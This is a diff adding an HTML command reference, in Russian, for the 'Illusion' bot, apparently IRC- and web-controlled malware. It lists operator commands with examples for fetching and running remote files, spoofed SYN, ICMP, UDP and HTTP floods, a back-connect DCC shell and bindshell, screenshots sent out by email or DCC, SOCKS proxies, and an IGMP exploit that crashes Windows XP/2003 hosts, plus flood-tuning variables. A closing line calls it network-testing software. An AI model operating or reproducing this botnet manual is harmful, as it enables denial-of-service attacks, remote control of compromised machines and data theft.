@@ -1,0 +1,238 @@
+<html><head><title></title></head>
+<body>
+<center><font size=5>Illusion Reference</font></center><br>
+<hr>
+Если команда начинается с префикса "!", то бот отвечает на нее.<br>
+Если команда начинается с префикса "@", то бот молча выполняет действиеXXXS.<br>
+Это имеет смысл только при IRC администрировании.<br>
+Примеры:<br>
+!synflood 10.0.0.1 80 - на такую команду бот ответит, например, что syn-флуд запущен<br>
+@synflood 10.0.0.1 80 - на такую команду бот ничего не ответит (в IRC) и просто<br> запустит флуд<br><br>
+Можно указывать <b>несколько команд в одной строке одновременно</b>:<br>
+они разделяются символом "|" - например, @login qwerty|!set i_freq 100|!echo<br><br>
+
+<center><font size=4>Commands</font></center><br>
+<b>login &lt;password/hash&gt;</b><br>
+авторизация. пароль или хеш пароля и маски на канале<br><br>
+
+<b>logout</b><br>
+...<br><br>
+
+<b>echo [text]</b><br>
+Сказать "[text]". Для теста.<br><br>
+
+<b>msgbox &lt;Text&gt;|&lt;Title&gt;</b><br>
+Показать messagebox. Пример: !msgbox Hello|How are you?<br><br>
+
+<b>set &lt;var&gt; &lt;value&gt;</b><br>
+Установить значение переменной. Читай ниже.<br><br>
+
+<b>sinfo</b><br>
+Показать информацию о системе<br><br>
+
+<b>vinfo</b><br>
+Показать информацию о переменных<br><br>
+
+<b>dinfo</b><br>
+Показать информацию о дисках<br><br>
+
+<b>status</b><br>
+Показать текущие задания (сокс, фтпд, флуд, и т.д.)<br><br>
+
+<b>get &lt;url&gt; &lt;local&gt; [noexec]</b><br>
+Скачать и запустить файл. если написать в конце noexec, запущен не будет, только скачается. Пример: !get http://site.com/file.exe C:\file.exe noexec<br><br>
+
+<b>getstop</b><br>
+Остановить скачивание файла<br><br>
+
+<b>irc &lt;command&gt;</b><br>
+Послать IRC серверу команду (пример: !irc PRIVMSG #chan :hello)<br><br>
+
+<b>op [nick]</b><br>
+Дать опа [nick]'у. Пример: !op BotMaster<br><br>
+
+<b>deop [nick]</b><br>
+Снять опа<br><br>
+
+<b>icmpflood &lt;host&gt; [nospoof]</b><br>
+ICMP флуд. (Спуфеные IP).<br>
+Можно указать вторым параметром ключевое слово "nospoof" -<br>
+тогда не будет использоваться формирование заголовков IP пакетов, флуд
+будет работать на всех OS, SP и т.п. Спуфа не будет.<br>
+Пример: !icmpflood 10.0.0.1 или !icmpflood site.com nospoof<br><br>
+
+<b>icmpfloodstop</b><br>
+Остановить ICMP флуд<br><br>
+
+<b>shutdown</b><br>
+Выключить бота<br><br>
+
+<b>reconnect</b><br>
+Переподключиться к IRC серверу<br><br>
+
+<b>nick [nick]</b><br>
+Сменить ник. Если не указан [nick], на рендомный (hostname[number]), иначе на тот, который указан. Пример: !nick Vasya<br><br>
+
+<b>ver</b><br>
+Посмотреть версию<br><br>
+
+<b>dccsend &lt;host&gt; &lt;file&gt; [port]</b><br>
+Послать файл &lt;file&gt; по DCC на хост &lt;host&gt; на порт 59 или [port]<br><br>
+
+<b>screenshot &lt;filename&gt;</b><br>
+Сделать скриншот и положить его в &lt;filename&gt;. Пример: !screenshot C:\123.bmp<br><br>
+
+<b>dccsendstop</b><br>
+Остановить посылку файла по DCC<br><br>
+
+<b>dccshell &lt;host&gt; [port]</b><br>
+Открыть DCC шелл, в виде чата. Вроде back-коннекта, пример: !dccshell 10.0.0.1<br><br>
+
+<b>dccshellstop</b><br>
+Остановить последнее<br><br>
+
+<b>processes [highlight_process]</b><br>
+Показать список процессов. Если указать [highlight_process], подсветить его красным цветом. Пример: !proceses explorer.exe<br><br>
+
+<b>socks4 [port]</b><br>
+Включить SOCKS4 сервер. Если порт не задан, включить на заданом по дефолту порту, или рендомному (зависит от настроек бота)<br><br>
+
+<b>socks5 [port]</b><br>
+Включить SOCKS5 сервер ...<br><br>
+
+<b>socks4stop</b><br>
+Остановить SOCKS4 сервер<br><br>
+
+<b>socks5stop</b><br>
+Остановить SOCKS5 сервер<br><br>
+
+<b>stopall</b><br>
+Остановить все, что показала команда !status<br><br>
+
+<b>ftpd [port]</b><br>
+Включить FTP-сервер.<br><br>
+
+<b>ftpdstop</b><br>
+Выключить FTP-сервер<br><br>
+
+<b>beep [freq] [time]</b><br>
+Включить динамик. Самая нужная, необходимая и актуальная команда!<br><br>
+
+<b>httpflood &lt;host&gt; [port] [url]</b><br>
+Включить HTTP-флуд. Запрос страниц методом GET. URL-если не задано, запрашивать случайные страницы (из списка), иначе ту, что задана. Пример: !httpflood test.com 80 forum/index.php<br>
+При таком флуде бот будет запрашивать http://test.com/forum/index.php
+<br><br>
+
+<b>httpfloodstop</b><br>
+Остановить HTTP флуд<br><br>
+
+<b>killall &lt;process_name&gt;</b><br>
+Убить процесс (по имени)<br><br>
+
+<b>getpid &lt;process_name&gt;</b><br>
+Получить Process ID<br><br>
+
+<b>kill &lt;PID&gt;</b><br>
+Убить процесс (по PID), похоже на Unix<br><br>
+
+<b>synflood &lt;host&gt; &lt;port&gt;</b><br>
+Включить SYN-флуд (спуфеные айпи). Пример: !synflood 10.0.0.2 80<br><br>
+
+<b>synfloodstop</b><br>
+Остановить SYN-флуд<br><br>
+
+<b>udpflood &lt;host&gt; [port]</b><br>
+Включить UDP-флуд.<br><br>
+
+<b>udpfloodstop</b><br>
+Выключить UDP-флуд.<br><br>
+
+<b>email &lt;smtp_server&gt; &lt;smtp_port&gt; &lt;email&gt; &lt;file&gt;</b><br>
+Послать файл по почту. Пример: !email smtp.mail.ru 25 test@mail.ru C:\123.bmp<br><br>
+
+<b>client</b><br>
+Показать, запущен ли WEB-клиент и IRC-клиент<br><br>
+
+<b>bindport [port]</b><br>
+Включить Bindshell.<br><br>
+
+<b>bindportstop</b><br>
+Остановить Bindshell.<br><br>
+
+<b>config</b><br>
+Показать конфиг (значения, которые настраивались в билдере)<br><br>
+
+<b>igmpexploit &lt;src_ip&gt; &lt;dst_ip&gt;</b><br>
+IGMP exploit против WinXP SP all & Win2003 all. Вешает удаленную систему. Пример: !igmpexploit 10.0.0.2 10.0.0.1<br><br>
+
+<b>ircadmin &lt;server&gt; &lt;port&gt; &lt;channel&gt; [password]</b><br>
+Поменять первую IRC-админку (сохраняется в реестре). Пример: !ircadmin 10.0.0.1 6667 #channel qwerty<br><br>
+
+<b>webadmin &lt;server&gt; &lt;port&gt; &lt;path&gt;</b><br>
+Поменять первую WEB-админку (в реестре сохраняется). Пример:
+!webadmin 10.0.0.1 80 /webadmin/<br><br>
+
+<b>ircradmin &lt;server&gt; &lt;port&gt; &lt;channel&gt; [password]</b><br>
+Поменять вторую IRC-админку (сохраняется в реестре). Пример: !ircadmin 10.0.0.1 6667 #channel qwerty<br><br>
+
+<b>webradmin &lt;server&gt; &lt;port&gt; &lt;path&gt;</b><br>
+Поменять вторую WEB-админку (в реестре сохраняется). Пример:
+!webadmin 10.0.0.1 80 /webadmin/<br><br>
+
+<br>
+<hr>
+<center><font size=4>Variables for SET</font></center><br>
+Команда set позволяет менять значения переменных (посмотреть можно по команде !vinfo)
+Переменные есть следующие<br><br>
+<b><font color=red>i_freq</font></b><br>
+Промежуток времени между посылкой очередного ICMP пакета<br><br>
+
+<b><font color=red>i_threads</font></b><br>
+Кол-во потоков ICMP флуда<br><br>
+
+<b><font color=red>i_datasize</font></b><br>
+Размер ICMP пакета<br><br>
+
+<b><font color=red>hf_freq</font></b><br>
+Промежуток времени между посылкой очередного HTTP пакета<br><br>
+
+<b><font color=red>hf_threads</font></b><br>
+Кол-во потоков HTTP флуда<br><br>
+
+<b><font color=red>s_freq</font></b><br>
+Промежуток времени между посылкой очередного SYN пакета<br><br>
+
+<b><font color=red>s_threads</font></b><br>
+Кол-во потоков SYN флуда<br><br>
+
+<b><font color=red>u_freq</font></b><br>
+Промежуток времени между посылкой очередного UDP пакета<br><br>
+
+<b><font color=red>u_threads</font></b><br>
+Кол-во потоков UDP флуда<br><br>
+
+<b><font color=red>u_datasize</font></b><br>
+Размер UDP пакета<br><br>
+
+<b><font color=red>spoof_ip</font></b><br>
+Можно задать значение "random", тогда спуфеные айпи для флуда будет случайные. Иначе тот, который задать.<br><br>
+
+<b><font color=red>tsrcport</font></b><br>
+Исходный порт для SYN флуда<br><br>
+
+<b><font color=red>usrcport</font></b><br>
+Исходный порт для UDP флуда<br><br>
+
+Примеры:<br>
+
+<i>!set s_freq 100 - это поставит частоту (задежрка между отсылками пакетов в 100 мс или 0.1 сек)<br>
+!set s_threads 30 - это поставит 30 потоков SYN-флуда<br>
+!set spoof_ip random - после этого пакеты флуда (со спуф. IP) будут слаться со случайных IP<br>
+!set spoof_ip 10.0.0.7 - после этого пакеты флуда будут слаться с IP 10.0.0.7<br>
+!set tsrcport 1324 - после этого SYN-пакеты будут слаться с порта 1324<br>
+!set hf_threads 50 - это поставит 50 потоков HTTP флуда<br></i>
+<br><br>
+<center><a href="http://illusion.cup.su/">http://illusion.cup.su</a><br>
+P.S. Эта программа только для тестирования сетей. Ответственности за ваши действия автор не несет.</center>
+</body>
+</html>
